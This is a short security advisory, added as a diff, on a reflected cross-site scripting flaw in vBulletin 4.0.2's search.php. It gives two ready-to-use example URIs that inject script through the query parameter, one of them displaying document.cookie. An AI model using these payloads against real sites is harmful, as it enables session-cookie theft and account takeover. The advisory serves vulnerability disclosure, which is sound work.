@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/38895/info
+
+vBulletin is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+vBulletin 4.0.2 is vulnerable. This issue does not affect vBulletin 3.x versions.
+
+The following example URIs are available:
+
+http://www.example.com/path/search.php?search_type=1&contenttype=vBBlog_BlogEntry&query="><script>alert('xss');</script>
+
+http://www.example.com/path/search.php?search_type=1&contenttype=vBBlog_BlogEntry&query="><script>alert(document.cookie);</script> 
